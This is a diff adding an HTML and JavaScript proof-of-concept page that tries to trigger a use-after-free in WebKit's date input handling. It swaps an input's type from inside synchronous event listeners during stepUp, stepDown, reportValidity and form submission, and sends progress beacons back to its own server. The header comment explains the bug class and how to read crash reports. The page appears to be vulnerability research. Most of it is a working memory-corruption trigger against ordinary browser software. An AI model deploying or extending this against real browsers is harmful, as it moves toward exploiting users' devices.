@@ -1,0 +1,123 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>W21-03 BaseDateAndTimeInputType UAF probe v1</title>
+<!--
+  BUG CLASS : WebKit Weekly W21-03 — HTMLInputElement type-swap frees the
+              current InputType (BaseDateAndTimeInputType subclass) MID-METHOD,
+              leaving a dangling InputType& / raw pointer that the method then
+              dereferences.  Fix family adds a retain / null-guard / reorder
+              around type() usage in the vulnerable method.
+  CNA REACH : PURE JS. No gc(), no Worker, no Wasm, no getUserMedia.
+              Primary variants (v1,v2,v4) use SYNCHRONOUS event dispatch
+              (invalid / input / change) which WebKit fires inline during
+              reportValidity()/stepUp()/stepDown() — the only JS-visible
+              re-entrancy that can land inside the C++ method without a
+              user gesture.  v3 (formdata/submit) and v5 (control) are
+              secondary / calibration.
+  CRASH-SAFE: We NEVER typeof/coerce a possibly-poisoned value.  Dangerous
+              native calls are bracketed by a beacon IMMEDIATELY BEFORE them
+              (a SIGSEGV is not catchable by try/catch; the last beacon is the
+              locator).  Each variant is independent so one fault localizes
+              cleanly.  Order = safest->most-dangerous is intentionally
+              REVERSED here: deterministic sync vectors FIRST so they run
+              before any async control can be starved by a portal drop.
+  INTERPRET : see W2103_README table shipped alongside.  A reproduced UAF
+              shows as a WebContent .ips whose stack contains
+              WebCore::BaseDateAndTimeInputType / ~InputType /
+              HTMLInputElement::setType / parseAttribute AND a beacon
+              sequence that stops mid-variant (silent kill) OR a v*_caught
+              with a non-JS-looking error.  NO crash + swapped=true +
+              normal completion = trigger did not re-enter (near-miss,
+              iterate the re-entrancy vector against the fix commit).
+-->
+</head><body><div id="o" style="font:12px monospace;white-space:pre-wrap"></div>
+<script>
+(function(){
+"use strict";
+var PREFIX="w2103";
+var COLLECT=[];
+function enc(o){var s="",k;for(k in o){if(Object.prototype.hasOwnProperty.call(o,k)){s+=(s?"&":"")+encodeURIComponent(k)+"="+encodeURIComponent(o[k]);}}return s;}
+function B(tag,obj){
+  var q="v="+PREFIX+":"+tag+(obj?("&"+enc(obj)):"");
+  var u="/beacon_img/"+Date.now()+"?"+q;
+  COLLECT.push({t:tag,o:obj||{}});
+  try{ (new Image()).src=u; }catch(e){}
+  try{ fetch(u,{mode:"no-cors",keepalive:true}); }catch(e){}
+  try{ var d=document.getElementById("o"); if(d) d.textContent+=tag+" "+JSON.stringify(obj||{})+"\n"; }catch(e){}
+}
+function alive(){ B("flush",{n:String(COLLECT.length)});
+  try{ navigator.sendBeacon("/beacon_aftertimer/"+Date.now()+"?v="+PREFIX+":flush", JSON.stringify(COLLECT)); }catch(e){}
+}
+// ---- preflight: which APIs actually exist in the CNA webview? ----
+var hasBody=!!document.body, hasCE=("customElements" in window),
+    inp=document.createElement("input"),
+    hasStepUp=(typeof inp.stepUp==="function"),
+    hasRV=(typeof inp.reportValidity==="function"),
+    hasSD=(typeof inp.stepDown==="function"),
+    hasFormdata=("onformdata" in window)||("FormDataEvent" in window);
+B("preflight",{body:hasBody?"Y":"N",ce:hasCE?"Y":"N",stepUp:hasStepUp?"Y":"N",
+  reportValidity:hasRV?"Y":"N",stepDown:hasSD?"Y":"N",formdata:hasFormdata?"Y":"N"});
+
+function mkDate(){ var e=document.createElement("input"); e.type="date"; e.value="2026-01-01"; return e; }
+
+// v1: stepUp() + synchronous 'input' listener that swaps type mid-method
+function v1(){
+  if(!hasStepUp){ B("v1_skip",{}); return; }
+  var el=mkDate(), swapped=false;
+  el.addEventListener("input",function(){ if(!swapped){ swapped=true; B("v1_swap_fired",{}); try{el.type="text";}catch(e){B("v1_swap_err",{m:String(e)});} } });
+  B("v1_pre_stepUp",{swapped:swapped});
+  try{ el.stepUp(); }catch(e){ B("v1_caught",{m:String(e)}); }
+  B("v1_post_stepUp",{swapped:swapped});
+}
+// v2: reportValidity() + synchronous 'invalid' listener that swaps type.
+//     reportValidity fires 'invalid' INLINE in WebKit -> strongest sync vector.
+function v2(){
+  if(!hasRV){ B("v2_skip",{}); return; }
+  var el=mkDate(); el.required=true; el.value=""; var swapped=false;
+  el.addEventListener("invalid",function(){ if(!swapped){ swapped=true; B("v2_swap_fired",{}); try{el.type="text";}catch(e){B("v2_swap_err",{m:String(e)});} } });
+  B("v2_pre_reportValidity",{swapped:swapped});
+  try{ el.reportValidity(); }catch(e){ B("v2_caught",{m:String(e)}); }
+  B("v2_post_reportValidity",{swapped:swapped});
+}
+// v3: form submit + 'formdata' listener swap (preventDefault to avoid nav).
+//     Secondary: formdata ordering vs submit-algorithm is version-specific.
+function v3(){
+  if(!hasFormdata){ B("v3_skip",{}); return; }
+  try{
+    var f=document.createElement("form"), el=mkDate();
+    f.appendChild(el); (document.body||document.documentElement).appendChild(f);
+    var swapped=false;
+    f.addEventListener("submit",function(ev){ ev.preventDefault(); });
+    f.addEventListener("formdata",function(){ if(!swapped){ swapped=true; B("v3_swap_fired",{}); try{el.type="text";}catch(e){B("v3_swap_err",{m:String(e)});} } });
+    B("v3_pre_requestSubmit",{swapped:swapped});
+    if(typeof f.requestSubmit==="function"){ f.requestSubmit(); } else { f.submit(); }
+    B("v3_post_requestSubmit",{swapped:swapped});
+    try{ f.remove(); }catch(e){}
+  }catch(e){ B("v3_caught",{m:String(e)}); }
+}
+// v4: stepDown() + synchronous 'change' listener swap (change can fire inline
+//     on programmatic value mutation in some WebKit builds).
+function v4(){
+  if(!hasSD){ B("v4_skip",{}); return; }
+  var el=mkDate(), swapped=false;
+  el.addEventListener("change",function(){ if(!swapped){ swapped=true; B("v4_swap_fired",{}); try{el.type="text";}catch(e){B("v4_swap_err",{m:String(e)});} } });
+  B("v4_pre_stepDown",{swapped:swapped});
+  try{ el.stepDown(); }catch(e){ B("v4_caught",{m:String(e)}); }
+  B("v4_post_stepDown",{swapped:swapped});
+}
+// v5 CONTROL: plain type swap, NO re-entrancy. Must never crash. Calibrates
+//     the baseline so a v1..v4 crash is attributable to re-entrancy, not to
+//     type-swapping per se.
+function v5(){
+  var el=mkDate();
+  B("v5_pre_plainSwap",{});
+  try{ el.type="text"; el.type="date"; }catch(e){ B("v5_caught",{m:String(e)}); }
+  B("v5_post_plainSwap",{});
+}
+
+// run deterministic sync vectors first, controls/secondary last
+v1(); v2(); v4(); v5(); v3();
+setTimeout(alive,1200);
+})();
+</script></body></html>
